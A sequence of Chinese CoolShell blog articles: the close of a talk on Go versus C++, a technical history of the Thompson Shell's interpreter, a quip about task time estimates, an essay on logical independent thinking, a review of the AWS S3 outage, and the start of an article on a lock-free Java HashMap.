现在，回到我们演讲开始提的那个问题:为什么Go，作为从头被设计为符合C++使用者习惯的语言，没有吸引很多C++程序员？严肃点说，我觉得是因为Go和C++在哲学方面有着巨大的不同。C++是将所有东西提到你指尖上(译者: 即多范式)。 我在C++11的FAQ上找到了这段引用:> C++能优雅地，灵活地，零损耗地(相比于手工操纵代码)表达抽象的能力大幅提升了。Go并非这种”围绕式”的。 你并不需要所有的东西都内建好。 你不需要对每个执行细节进行精细的控制。 比如，你不需要RAII，但你拥有一个垃圾回收器，也意味着你不需要执行释放内存的操作。你得到的是一组非常强有力但易于理解，易于用来构建积木的功能，这些积木可以用来组合出一个你需要的问题的解法。 这并不意味着它能像别的一些语言创造的解法一样快速，复杂，或带来思想上的激励，但是它总能保证易于书写，易于阅读，易于理解，易于维护，而且可能更安全。从另一个角度说，这当然算作过度简化:Python和Ruby程序员转到Go，因为他们不需要牺牲表达能力，却获得了性能的提升，并且能好好玩并发系统了。C++程序员 _并没有_ 转到Go是因为他们好不容易获得了对程序的精细控制，并且不想牺牲它们的任何一部分。 对他们而言，写软件不仅包括把事情做完，而且包括用特定的方式完成。
关键是，在将来，Go的成功将会颠覆他们的世界观。并且从一开始我们就应该意识到这点。 对于C++11的新特性很兴奋的人们并不关心一个拥有如此少特性的语言。 即使最后他提供了如此多。谢谢。（全文完）# Unix考古记：一个“遗失”的shell作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**(感谢网友Leo投递此文)**谨以此文纪念伟大的计算机科学巨匠Ken Thompson和Dennis Ritchie，并同时向其他所有为Unix发展做出贡献的黑客致敬。目录* 历史的尘埃   * 命令结构和规范   * 解释器的原理与实现   * 预处理(preprocessor)   * 词法扫描(lexical scanning)   * 语法分析(syntax parser)   * 语义分析(Semantic Analyzer)   * 执行命令(Executor)   * 孰优孰劣   * Thompson Again Shell?   * 一些感想   * 参考资料#### 历史的尘埃Unix作为一个举世闻名的操作系统已有40余年的历史，围绕着这个古老的操作系统的发展又衍生出了一系列外围软件生态群，其中一个非常重要的组件就是shell。 **它是操作系统最外层的接口，负责直接面向用户交互并提供内核服务，** 包括命令行接口(CLI)或图形界面接口(GUI)两种形式。以CLI为例，它提供一套命令规范，是一种解释性语言，将用户输入经过解释器(interpreter)输出使其转化成真正的系统调用，实现人机交互的功能。
和操作系统一样，shell也经历了一个漫长的演变史。如今大部分资料讲述最古老的shell都是从1977年的Bourne Shell说起的，它最初移植到Unix V7上，被追认整个shell家族成员的鼻祖，后来的种群都是从其身上分支出来的。!Linux shells since 1977对于1977年之前的历史很多资料大多一笔带过或略过不提。事实上，第一个移植到Unix上的shell却不是Steve Bourne写的，早在1975年5月，贝尔实验室就对外发布了第一个广泛传播的Unix版本——Unix V6（之前开发的版本只供内部研究之用），其根目录下的/bin/sh是第一个Unix自带的shell，由Ken Thompson写的，因此也被称为Thompson Shell。甚至，更早可以追溯到1971年的时候，Thompson Shell就作为一个独立于内核的应用程序而实现了，只不过从1975年正式问世到1977年被取代，短短两年的寿命使得它很少为大多数人所认识。关于Thompson Shell被取代的原因在后文中会给出说明，这里着重介绍一下该shell本身的一些技术细节。坦白讲，关于Thompson Shell的资料有点稀缺，但至少还能从网上找到源代码和在线文档。Thompson Shell本身是由一个不足900行代码的解释器和一些外部命令工具组件(utilities)构成，用K&R C写成，下面给出各个组件的相关源码和文档链接。
* **解释器sh** ：解析各种shell命令，包括内置命令和外部命令；源码sh.c；安装路径/bin/sh；手册sh(1)。* **内置命令** 手册包括chdir(1)，login(1)，newgrp(1)，shift(1)，wait(1)。下面是外部命令：* **exit命令** ：退出一个文件；源码exit.c；安装路径/bin/exit；手册exit(1)。* **goto命令** ：在一个文件内跳转shell控制流程；源码goto.c；安装路径/bin/goto；手册goto(1)。* **if命令** ：条件判断表达式，是test命令的前身；源码if.c；安装路径/bin/if), 手册if(1)。* **glob命令** ：扩展命令参数通配符；源码glob.c；安装路径/etc/glob；手册glob(8)。#### 命令结构和规范尽管后来遭“埋汰”，Thompson Shell仍有着不容否认的历史地位，其最大的价值在于 **它奠定了shell命令语言结构和规范的基础，而且其解释器具有跨平台的可移植性，并影响到了后来包括Bourne Shell在内的各种脚本语言设计实现。** 下面我们就以其中5个特性重温一些大家已经耳熟能详的命令规范，你也可以通过sh(1)手册查看原始资料。
* **过滤器/管道线(filter/pipeline)。** 这绝对是要载入Unix史册的发明，创立者是Douglas McIlroy，Thompson Shell引入并实现了这个伟大的概念——一个或多个命令组成一根过滤器的链条，由’|’或’^’符号分隔。除最后一个命令之外，每个命令的标准输出都被作为下一个命令的标准输入。这样每个命令都作为一个独立的进程来运行，并通过管道与邻近的进程相连接。圆括弧内的命令序列整体上可以替代单个命令作为过滤器实现，比如用户可以输入”(A;B)|C”。* **命令序列和后台进程。** 分号’;’指示多个命令序列化执行。’&’符号指示该命令在后台异步执行，使得前面的管道线不必等待其终止，仅仅报告一个进程id，这样用户以后可以通过kill命令与它通信。有益于进程管理。* **I/O重定向。** 它利用了Unix设计上的一个重要特性—— **一切皆文件** ，用三个符号表示：”重定向输出，如果文件不存在则创建它，如果文件存在则截断它；’>>’追加模式重定向输出，如果文件不存在则创建它，如果文件存在则追加输出至末尾处。* **通配符扩展(globbing)。** 通配符的概念源自于正则表达式，使得解释器智能地处理用户不完全输入，比如记不清文件名、一次性输入多个文件等。’?’匹配任意单一字符；’*’匹配任意字符串（包括空串）；成对'[‘和’]’定义了字符集合一个类，可匹配方括号内任意成员，用’-‘两端可指定一系列连续字符匹配范围。
* **参数传递。** 这里主要引入了位置参数和选项参数的概念：’$n’指示shell调用的第n个参数替代；还定义了两个选项参数’-t’和’-c’，前者用于交互，导致shell从标准输入中读入一行作为用户执行的系统命令，后者指示shell将附带的下一个参数作为命令执行（可正确处理换行符），是对’-t’的补充，特别是调用者已经读取了命令其中某些字符的情况下。如果不带选项参数则直接读取文件名#### 解释器的原理与实现接下来马上要进入核心部分了，为了搞懂shell解释器原理，我们要对其整个工作流程做个描述（这里给出一份带注解的sh.c源码剖析）。读过《编译原理》的同学知道，解释器的实现跟编译器差不多，只不过省略了生成目标代码这一步，直接将用户输入（shell命令）转化成输出（系统调用）。 **软件前端是一致的，包括预处理、词法扫描、语法分析和语义分析，最后还要附加一个进程管理。** 当然相较于现代编译器，Thompson Shell解释器在算法和规模上都要简单得多，不过原理上是相通的，何况年代上要比Lex & Yacc还要早。麻雀虽小，五脏俱全，对于初学者来说，从Thompson Shell去入手编译原理或许不失为一种好选择。
#### 预处理(preprocessor)同C预处理器需要事先将源代码中包含的宏和头文件展开一样，Thompson Shell首先需要处理命令中的 **选项参数** 和 **位置参数** 。选项参数有两种’-t’和’-c’，决定了shell从标准输入还是参数缓存中读取字符（见sh(1)）。此外字符序列中还要处理 **反斜杠’\’** ，判断是转义字符还是行接续符，前者对下一个字符设置引用标识，表明做普通字符处理，后者将紧邻其后换行符过滤掉。位置参数是 **美元符号’$’** 打头的，后带一个数字，如’$n’，预处理器对shell命令参数从头开始计数，返回数字n指定的参数位置。如果遇上double’$$’，则表示当前的进程标识，调用getpid()获取。注意到预处理器需要一次读取多个字符，这样就会多读一个不必要的字符。对此解释器提供了一种 **预读(peek)** 方式，即每次从输入流读取一个字符时，放入一个预读缓存里（只有一个int大小的堆栈），也叫 **回退(push back)** 。此后先从预读缓存中读取，如果缓存被读完，则从输入流中读取。#### 词法扫描(lexical scanning)
经过预处理后的字符序列将被切割成为一系列 **词法记号(token)** ，安置在token列表中，扫描器将对以下几类字符做如下处理。* **空格和tab** ：简单过滤。* **引号** ：需要成对出现，字符本身被过滤，一对引号之间所有字符都被设置引用标识，作为一个token。* **元字符** ：如’&’，’|’等，字符本身作为一个单独token。* **其他字符** ：一律填充token，直到碰上以上字符分隔为止。举一个例子，当我们输入命令”(ls; cat tail) >junk”，那么token列表映像将是这样的：#### 语法分析(syntax parser)语法分析就是将token列表中的元素作为 **表达式(expression)** 并以节点为单位构建语法树，简单命令是一个表达式，而复合命令以及命令序列是多个表达式的组合。Thompson Shell中以简单数组作为语法树的容器，实际上这是结构体的一种变形，只不过每个成员字段大小都一样（都是sizeof int）而已。一个语法树节点最多有6个字段（大小根据类型可变），分别是* **DTYP（节点类型）** ：每个节点都有唯一的类型，又分为四种——TCOM（简单命令）、TPAR（复合命令）、TFIL（过滤器/管道线）、TLST（命令序列）。
* **DLEF（左子树节点）** ：相当于链表指针，根据DTYP定义有所不同。如过滤器类型左子树节点为前一个命令的输出重定向文件，右子树节点为后一个命令的输入重定向文件。* **DRIG（右子树节点）** ：同上。* **DFLG（节点属性）** ：这是个标志位(flag)，决定该节点包含命令的属性以及以什么样的状态执行。* **DSPR（子命令）** ：两重含义，对于简单命令，该字段为空；对于复合命令，该字段指向子语法树节点。* **DCOM（命令字符）** ：引用命令字符序列。语法树节点生成顺序根据token列表中每个元素的 **优先级(priority)** 而定，首先遍历整个列表，找到优先级最高的token作为根节点，再分别生成左右子树，这是一种最简单的 **自顶向下(top-down)** 解决方案。各个token优先级视DTYP字段而定优先级|Token|DTYP---|---|---第一级|‘&’ ‘;’ ‘\n’|TLST第二级|‘|’ ‘^’|TFIL第三级|‘(‘ ‘)’|TPAR第四级|其它字符|TCOM语法树的构建过程中还使用了一种基于 **“有限状态机(finite-state machine)”** 的动态规划算法，其实现是将整个逻辑流程划分为四个状态：syntax、syn1、syn2、syn3，对应于上面token优先级，程序在每个状态下都生成一个相应类型的节点，同时还生成四种策略，以决议下一步将转移到何种状态（根据优先级搜索对应的token）。这个四种策略分别是
* **生成左子树** ：左边token列表递进到下层状态。* **生成右子树** ：右边token列表并回溯到上层状态或递归调用。* **找不到对应token** ：保持原有token列表递进到下层状态。* **生成节点** ：直接返回节点。当我们遍历完整个token列表后，程序总是能返回最初的调用点，即根节点上，从而生成一棵完整的语法树。这种算法的好处是 **程序员不必关注具体实现的每个细枝末节，只要关注相应的状态并制定对应的转移策略即可。** 还值得一提的是每个转移策略都是发生在赋值语句或返回语句上，并使用函数实参保存临时变量，这样就避免了调用次数过多导致堆栈溢出。依旧举两个个例子，比如命令”A & ; B | C”对应的语法树命令”(A ; B) | C”对应的语法树：#### 语义分析(Semantic Analyzer)语法分析仅仅停留在token表达式合法性层面上，它并不知道该表达式是否有意义，比如哪些命令是要后台运行，哪些命令的I/O被重定向到管道线上，通配符该如何扩展等等，这时候要靠语义分析了。这里的“语义”体现在对特殊字符的动态处理以及语法树节点的字段设置，根据 **上下文(context)** 而定。比如对于元字符’>’，我们要判断输出重定向到哪个文件，是截断还是追加。对于通配符’?’、’*’和'[…]’，我们要决定对哪些字符进行扩展，这些在/etc/glob中专门处理。对于语法树节点，除了自身固有属性之外，还需要继承上层节点的属性，以及下推属性到下层子树节点，下面列了一张表格说明。
DTYP|DLEF/DRIG|DFLG|DSPR---|---|---|---TLST| 可以为空，也可以是其它节点，类型可以是TLST/TFIL/TCOM | 自身属性为0；如果带’&’，则下推属性FINT|FAND|FPRS到左右子树（忽略信号、后台异步，打印pid） | 空TFIL| 必须同时存在、，类型只能是TCOM或TPAR | 自身属性继承自上层TLST；下推FPIN到左子树节点；下推FPOU到右子树节点。 | 空TPAR| 空 | 继承上层的TLST和TFIL；如果是追加模式重定向输出，加上FCAT；如果是复合命令中最后一个子命令，加上FPAR， 将不会fork子进程。 | 子命令TCOM| 左子树节点为输入重定向文件，右子树为节点输出重定向文件。 | 空#### 执行命令(Executor)当前面一系列步骤之后，如果错误计数为0，则解释器从语法树的根节点开始， **深度优先遍历** 所有节点，并根据前面语法和语义分析得到的类型和属性，一一执行所包含的命令，以生成最后的系统调用。对于 **命令序列(TLST)节点** ，从左至右顺序执行子树节点命令。对于 **过滤器(TFIL)节点** ，创建管道文件句柄，作为左右子树的重定向文件。
对于 **简单命令(TCOM)和复合命令(TPAR)节点** ，首先筛选出系统内置命令(built- in)，对于剩下的外部命令则fork一个子进程执行它。如果是复合命令中最后一个子命令，那么仍在原来的进程上执行而不必创建新进程。可执行文件路径按先后顺序搜索：①本地路径；②/bin；③/usr/bin。**多进程环境下，特别要注意文件句柄管理** 。命令间共享标准输入输出设备之外，还会重定向到管道线，而父进程在fork之后子进程会获取一份文件句柄拷贝，所以 **父进程必须在fork之后立即关闭闲置的管道线句柄（如果有的话）以免造成资源泄漏，子进程也将在重定向之后关闭管道线句柄。**对于 **后台命令** 需要打印pid，但不需要响应中断信号，父进程也不必等待子进程终止。其余进程命令执行中可捕获中断信号，并转入相应的处理函数。解释器用内置的errno全局变量保存进程终止状态，并生成 **终止报告(termination report)** ，系统调用wait()用于返回终止进程的pid并输出报告消息索引。#### 孰优孰劣尽管Thompson Shell是一款优秀的命令解释器，还产生了多项历史创举，但遗憾的是依然得不到命运女神的垂青，这要归咎于其自身的缺陷—— **功能单一、命令分散、控制流过于简单，尚无法用来编写脚本(script)** 。随着Unix日益壮大，它已经无法应付趋于繁杂的编程项目了。那时还出现了一个叫John Mashey的人写的PWB Shell（又叫做Mashey Shell），基于Thompson Shell做了些改进，扩展了命令集，增加了shell变量，还增加了if-then-else- endif，for，while等控制逻辑。不幸的是它比Thompson Shell更短命，因为1977年它遇上了一个强劲的对手。
没错，那就是Bourne Shell，它的主要优点是真正实现了结构化脚本编程，比之前的shell实现得都要好，更要命的是它与前两个shell都不兼容，于是一场标准化的论战开始了。在David G. Korn)（ksh作者）写的“ksh – An Extensible High Level Language”一文中提及，Steve Bourne和John Mashey在三次连续的Unix用户组集会上争论他们各自的理由。在这些集会之间，各自增进他们的shell来拥有对方的功能。还设立了一个委员会来选择标准shell，最终还是选择了Bourne shell作为标准。于是从Unix V7开始就有了前面所说的”Bourne Shell Family”。然而历史上没有完美的技术，随着八、九十年代操作系统迅猛发展，针对Bourne Shell的诟病也越来越多了。在解释器本身实现上，我看到网上一个对其评价是“universally considered to be one of the most horrible C code ever written”，至于原因去看一下mac.h就知道了，包括基本运算符、关键字在内的大量宏定义使得整个代码看上去简直不是C写的，也许Bourne是想把解释器打造成自己独特的风格吧，也难怪后来的bash以 **“born again”** 命名就是对其祖先的戏谑性调侃。另外内存管理上的一些毛病带来平台可移植性问题，至于其中的技术细节有点高级，超出本文范畴。
#### Thompson Again Shell?虽然历史没有给Thompson Shell一个机会，但它并非就此同Unix V6那样一同沦为开源博物馆上的古老“化石”。作为出自顶级黑客之手的作品，作为伴随Unix那样伟大操作系统一同曾经流行计算机的产物，至今仍受国内外程序员的缅怀，或将其改写，或为其作注。比如国外一个站点v6shell.org上就实现了一个免费开源的可移植性shell，它兼容并扩充原来的Thompson Shell并且可用来做脚本编程。再比如中国程序员寒蝉退士在其个人博客上发布了一个注解版，并对原版做了一些改写，主要是将 **K &R C**转为 **ANSI C** ，并且符合 **POSIX规范** ，使原本晦涩难懂的源码变得清晰易读起来。正是因为接触到他的版本激起了我对老Unix的考古兴趣，才有了这篇“考古笔记”。我在想不知今后会不会像bash那样，出一个tash来呢？#### 一些感想本来全文应该就此结束了，但此时此刻不禁想多说几句。这篇笔记当初并非有意而为之，在hacking源码的过程中感想积累多了也就逐渐成章了。看代码、作注解、查资料、写此文，前后历经四个多礼拜，是在繁杂的工作中“挤乳沟”挤出来的零散时间片拼凑起来的，虽然文字不长但也算耗费了一番心血，酸甜苦辣心中自明，体会到踏上社会之后潜下心做研究之艰难。如今面对这样一份不到900行写成的，没有一行多余的代码， **简洁(clarity)、干净(clean)、快速(fast)，** 这就是Pure C的魅力，我深为这种厚重的编程功力所折服，正所谓 **“大道至简”** 吧。虽然要完全弄懂它需要很多时间，但我相信这种代价却是值得的。
最后再八卦一下，2011年Dennis Ritchie去世了，有人生前问过他“学C需要多久才能成为熟练开发者并写出重要产品代码？”，Ritchie回答“我不知道，我从没去学过C。”(I don’t know. I never had to learn C.)其实这里已经给出了答案—— **那就是没有比去阅读Unix源代码更好的选择了，某种意义上C语言就是为Unix而生的。**!Dennis Mac Ritchie#### 参考资料The Unix Heritage Society：Unix社区遗产，上面有v6和v7以及其它一些衍生版本的操作系统源代码。The Traditional Bourne Shell Family：Bourne Shell家族简史。v6shell：osh，一个基于Thompson Shell的开源可移植性old shell。寒蝉退士的博客：Thompson Shell的一个注解版。Evolution of shells in Linux：简述Linux Shell演变史。附录一个中文注释的 shell源码（全文完）# 开发时间估计作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn
项目管理中，项目任务时间估计是其中一个重要的环节。各种管理员人都觉得时间估计很重要，都希望时间估计能准确一些，但是，事实却并不如此。事实上，会下面这样的结果。目前状态 | 完成进展 | 剩余任务估计   ---|---|---   任务刚被分配，还没有做调查 | 完成0% | 大约2周   完成需求分析和调查，攻克了难点 | 完成50% | 大约2周多一点   我几乎做完了。只有出了点我事先没有想到的岔子。   不过，我已找到解决方法了。只是还需要一些时间 | 完成90% | 大约2周多一点   我全部做完了，只是还要写文档，做Code Review，   单元测试和错误处理 | 完成99% | 还需要2周呵呵，这是怪我们的项目管理的方法论呢？还是怪我们太过草率的程序员呢？*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language# 使用简单的逻辑方法进行独立思考作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn这是一个非常复杂的世界，这个世界上有很多各式各样的观点和思维方式，作为一个程序员的我，也会有程序员的思维方式，程序员的思维方式更接近数学的思维方式，数学的思维方式让可以很容易地理清楚这个混乱的世界，其实，并不需要太复杂的数学逻辑，只需要使用一些简单的数学方法，就可以大幅提升自己的认识能力，所以，在这里，记录一篇我自己的思维方式，一方面给大家做个参考，另一方面也供更高阶的人给我进行指正。算是“开源我的思维方式”，开放不仅仅是为了输出，更是为了看看有没有更好的方式。
我的思维方式中，使用数学逻辑的方式进行思考，通常来说，我会使用五步思考的方式：**第一步：信息数据可考证** 。如果一个观点或是一个见解的数据是错误的，那么就会造成后面的观点全是错的，所以，首要的是要进行数据的查证或考证。一般来说，如果一篇文章的作者足够严谨的话，他的需要给他的数据建立相关的引用或是可以考证的方法方式。如果一篇文章中出现的是，“有关专家表明”、“美国科学家证明”、“经济学家指出”，但是没有任出处，也没有点明这个专家或是科学家的名字，或是，也没有说明或引用让读者可以自己去验证的方法。那么，其引用的话或是数据是无法考证的，如果是无法考证的，那么，这篇文章的水份就非常大了。一般来说，当我读到一篇文章中的东西没有可考证的来源或是方法时，通常来说，我就不会再读了，因为这篇文章的价值已经不大了，如果我关心这篇文章中的东西，我会改为自己去查找的方式，虽然变“重”了，但是很安全。（所以，像Wikipedia这样的网站是我经常去获得信息的地方，因为信息可以被考证是其基本价值观）**第二步：处理集合和其包含关系** 。这是一个非常简单的人人都会的数学逻辑。比如：哲学家是人，柏拉图是哲学家，所以，柏拉图是人。就是一个在包含关系下的推理。你不要小看这个简单的逻辑，其实很多人并不会很好的应用，相反，当感情支配了他们以后，他们会以点代面，以特例代替普遍性。比如，地图炮就是一种，他们看到了多个案例，他们就开始把这个案例上升上更大的范围，比如：河南人新疆人都是小偷，上海人都是小市民。日本人都是变态和反人类……等等。除了这些地图炮外，还有否定整个人的，比如一个人犯了个错或是性格上有缺陷，就会把整个人全盘否定掉，员工抢个月饼就上升到其价值观有问题……。在数学的逻辑包含中，超集的定义可以适用于子集，通过子集的特征可以对超集进行探索，但是没法定义超集。另外，集合的大小也是一个很重要的事，幸存者偏差会是一个很容易让人掉下去的陷阱，因为可能会有很大的样本集可能在你的视线盲区。
**第三步：处理逻辑因果关系** 。所谓因果关系，其实就是分辨充分条件、必要条件和充分必要条件，然后处理其中的逻辑是否有关联性，而且有非常强的因果关系。没有能力分辨充分必要条件处理因果关系是很多人的硬伤。就像我在《努力就会成功》中说的一样，“努力” 和 “成功”是否有因果关系？各种逻辑混淆、概念偷换、模糊因果、似是而非全是在这里。比如：掩耳盗铃、刻舟求剑就是因果关系混乱的表现。人们会经常地混淆两个看来一起发生，但是并没有关联在一起的事。因果关系是最容易被模糊和偷换的，比如：很多人都容易混淆“加班”就会有“产出”，混淆了“行动”就会有“结果”，混淆了“抵制”就会赢得“尊重”，混淆了“批评”等于“反对”……等等。除了这些以外，微信公众号里的很多时评文章，他们的文章中的结论和其论据是没有因果关系的，好多文章就是混淆、模糊、偷换…… **因果关系出问题的文章读多了是对大脑有损伤的，要尽量远离** 。**第四步：找到靠谱的基准线** 。就像我们写代码一样，我们都是会去找一些最佳实践或是业内标准，原因是因为，这样的东西都是经过长时间被这个世界上很多人Review过的，是值得依赖和靠谱的，他们会考虑到很多你没有考虑过的问题。所以，你也会看到很多时评都会找欧美发达国家的作参考的做法，因为毕竟人家的文化是相对比较文明、科学、开放和先进的。找到世界或是国际的通行标准，会更容易让人进步。比如：以开放包容加强沟通的心态，就会比封闭抵制敌对的心态要好得多得多，智者建桥，愚者建墙。当然，我们也开始发现，有一些事上，有利于自己的就对标，不利于自己的就不对标，而且，除了好的事，不好的事也在找欧美作对标，于是开始“多基准线”和“乱基准线”，这种方式需要我们小心分辨。
**第五步：更为深入和高维的思考** 。如果一件事情只在表面上进行思考其实只是一种浅度思考，在Amazon，线上系统出现故障的时候，需要写一个Correction of Errors的报告，其中需要Ask 5 Whys（参看 Wikipedia 的 Five Whys 词条），这种思考方式可以让你不断追问到深层次的本质问题，会让你自己做大量的调查和研究，让你不会成为一个只会在表面上进行思考的简单动物。比如：当你看到有出乎你意料的事件发生时（比如负面的暴力事件），你需要问一下，为什么会发生，原因是什么？然后罗列尽可能全的原因，再不断地追问并拷证下去（这跟写程序一样，需要从正向案例和负向案例进行考虑分析，才可能写出健壮性很强的代码），我们才会得出一个比较健壮的答案或结构。需要注意的是，在上述的这五种思维方式下，你的思考是不可能快得起来的，这是一个“慢思考”（注：如果读过《思考，快与慢》这本书的人就知道我在说什么），独立思考是需要使用大脑中的“慢系统”，慢系统是反人性的，所以，能真正做到独立思考的人很少。更多的人的“独立思考”其实只不过是毫无章法的乱思考罢了。通过上述的这五点，我相信你是很容易识别或是分辨出哪些信息是靠谱的，哪些信息是很扯的，甚至会改善你自己的言论和思考。但是， **请注意，这些方法并不能让你获得真理或是真相** 。但是这也够了，一个人如果拥有了能够分辨是非的能力，也是很不错的了。虽然不知道事实是什么，但是你也不会盲从和偏信，从而不会被人煽动，而成为幕后黑手的的一只“肉鸡”。
多说两句，下面是一些我个人的一些实践：* 当新闻报道报道的不是客观事实，而是加入了很多观点，那么这篇新闻报道是不可信的。   * 对于评论性的文章，没有充足权威可信的论据时，不能完全相信。   * 不是当事人，不是见证人，还要装作自己是知情的……不知道这种人的自信怎么来的？   * 信息不公开的，并有意屏蔽信息的，不能作为可信的信息源。   * 当出现大是或是大非的事时，一定要非常小心，这个世界不存在完全的美和完全的丑，这样的观点通常来说都是危险的，此时要多看看不同角度的报道和评论，要多收集一些信息，还要多问问为什么。欢迎你告诉我一些你的实践和思维方式。（全文完）# AWS 的 S3 故障回顾和思考作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn继Gitlab的误删除数据事件没几天，“不沉航母” AWS S3 （Simple Storage Service）几天前也“沉”了4个小时，墙外的半个互联网也跟着挂了。如约，按 AWS 惯例，AWS今天给出了一个简单的故障报告《Summary of the Amazon S3 Service Disruption in the Northern Virginia (US-EAST-1) Region》。这个故障和简单来说和Gitlab一样，也是人员误操作。先简单的说一下这份报中说了什么。
#### 故障原因简单来说，这天，有一个 AWS 工程师在调查 Northern Virginia (US-EAST-1) Region 上 S3 的一个和账务系统相关的问题，这个问题是S3的账务系统变慢了（我估计这个故障在Amazon里可能是Sev2级，Sev2级的故障在Amazon算是比较大的故障，需要很快解决），Oncall的开发工程师（注：Amazon的运维都是由开发工程师来干的，所以Amazon内部嬉称SDE- Software Developer Engineer 为 Someone Do Everything）想移除一个账务系统里的一个子系统下的一些少量的服务器（估计这些服务器上有问题，所以想移掉后重新部署），结果呢，有一条命令搞错了，导致了移除了大量的S3的控制系统。包括两个很重要的子系统：1） **一个是S3的对象索引服务（Index）** ，其中存储了S3对象的metadata和位置信息。这个服务也提供了所有的 GET，LIST，PUT 和DELETE请求。2） **一个是S3的位置服务系统（Placement）** ，这个服务提供对象的存储位置和索引服务的系统。这个系统主要是用于处理PUT新对象请求。
这就是为什么S3不可访问的原因。在后面，AWS也说明了一下故障恢复的过程，其中重点提到了这点——虽然整个S3的是做过充分的故障设计的（注：AWS的七大Design Principle 之一 Design for Failure）—— 就算是最核心的组件或服务出问题了，系统也能恢复。但是，可能是在过去的日子里 S3 太稳定了，所以，AWS 在很长很长一段时间内都没有重启过 S3 的核心服务，而过去这几年，S3 的数据对象存储级数级的成长（S3存了什么样数量级的对象，因为在Amazon工作过，所以多大概知道是个什么数量级，这里不能说，不过，老实说，很惊人的），所以，这两个核心服务在启动时要重建并校验对象索引元数据的完整性，这个过程没想到花了这么长的时候。而Placement服务系统依赖于Index 服务，所以花了更长的时间。了解过系统底层的技术人员应该都知道这两个服务有多重要，简而言之，这两个系统就像是Unix/Linux文件系统中的inode，或是像HDFS里的node name，如果这些元数据丢失，那么，用户的所有数据基本上来说就等于全丢了。而要恢复索引系统，就像你的操作系统从异常关机后启动，文件系统要做系统自检那样，硬盘越大，文件越多，这个过程就越慢。
另外，这次，AWS没有使用像以前那样 Outage 的故障名称，用的是 “Increased Error Rate” 这样的东西。我估计是没有把所有这两个服务删除完，估计有些用户是可以用的，有的用户是则不行了。#### 后续改进在这篇故障简报中，AWS 也提到了下面的这些改进措施——1） **改进运维操作工具** 。对于此次故障的运维工具，有下面改进：* **让删除服务这个操作变慢一些** （陈皓注：这样错了也可以有时间反悔，相对于一个大规模的分布式系统，这招还是很不错的，至少在系统报警时有也可以挽救）* **加上一个最小资源数限制的SafeGuard** （陈皓注：就是说，任何服务在运行时都应该有一个最小资源数，分布式集群控制系统会强行维护服务正常运行的最小的一个资源数）* 举一反三，Review所有和其它的运维工具，保证他们也相关的检查。2） **改进恢复过程。** 对于恢复时间过长的问题，有如下改进：* **分解现有厚重的重要服务成更小的单元** （在 AWS，Service是大服务，小服务被称之为 Cell），AWS 会把这几个重要的服务重构成 Cell服务。（陈皓注：这应该就是所谓的“微服务”了吧）。这样，服务粒度变小，重启也会快一些，而且还可以减少故障面（原文：blast radius – 爆炸半径）
* **今年内完成对 Index 索引服务的分区计划** 。#### 相关思考下面是我对这一故障的相关思考——0） **太喜欢像Gitlab和AWS这样的故障公开了** ，那怕是一个自己人为的低级错误。不掩盖，不文过饰非，透明且诚恳。Cool!1）这次事件，还好没有丢失这么重要的数据，不然的话，将是灾难性的。2）另外，面对在 US-EASE-1 这个老牌 Region 上的海量的对象，而且能在几个小时内恢复，很不容易了。3）这个事件，再次映证了我在《关于高可用的系统》中提到的观点： **一个系统的高可用的因素很多，不仅仅只是系统架构，更重要的是——高可用运维** 。4） **对于高可用的运维，平时的故障演习是很重要的。** AWS 平时应该没有相应的故障演习，所以导致要么长期不出故障，一出就出个大的让你措手不及。这点，Facebook就好一些，他们每个季度扔个骰子，随机关掉一个IDC一天。Netflix 也有相关的 Chaos Monkey，我以前在的路透每年也会做一次大规模的故障演练——灾难演习。5）AWS对于后续的改进可以看出他的技术范儿。可以看到其改进方案是用技术让自己的系统更为的高可用。然后，对比国内的公司对于这样的故障，基本上会是下面这样的画风：
a）加上更多更为严格的变更和审批流程，b）使用限制更多的权限系统和审批系统c）使用更多的人来干活（一个人干事，另一个人在旁边看）d）使用更为厚重的测试和发布过程e）惩罚故障人，用价值观教育工程师。这还是我老生长谈的那句话—— **如果你是一个技术公司，你就会更多的相信技术而不是管理。相信技术会用技术来解决问题，相信管理，那就只会有制度、流程和价值观来解决问题** 。（注意：这里我并没有隔离技术和管理，只是更为倾向于用技术解决问题）**最后，你是要建一个 “高可用的技术系统” ，还是一个 “高用的管理系统”？ ;-)**（全文完）# 无锁HashMap的原理与实现作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**(本文由onetwogoo投稿)**在《疫苗：Java HashMap的死循环》中，我们看到，java.util.HashMap并不能直接应用于多线程环境。对于多线程环境中应用HashMap，主要有以下几种选择：1. 使用线程安全的java.util.Hashtable作为替代。   2. 使用java.util.Collections.synchronizedMap方法，将已有的HashMap对象包装为线程安全的。   3. 使用java.util.concurrent.ConcurrentHashMap类作为替代，它具有非常好的性能。
而以上几种方法在实现的具体细节上，都或多或少地用到了互斥锁。互斥锁会造成线程阻塞，降低运行效率，并有可能产生死锁、优先级翻转等一系列问题。CAS(Compare And Swap)是一种底层硬件提供的功能，它可以将判断并更改一个值的操作原子化。关于CAS的一些应用，《无锁队列的实现》一文中有很详细的介绍。目录* Java中的原子操作   * 无锁链表的实现   * 无锁HashMap的难点与突破   * 实现细节     * 初始化下标操作     * 插入操作     * 查找操作     * 删除操作   * 参考文献#### Java中的原子操作在java.util.concurrent.atomic包中，Java为我们提供了很多方便的原子类型，它们底层完全基于CAS操作。例如我们希望实现一个全局公用的计数器，那么可以：private AtomicInteger counter = new AtomicInteger(3);其中，compareAndSet方法会检查counter现有的值是否为oldValue，如果是，则将其设置为新值newValue，操作成功并返回true；否则操作失败并返回false。
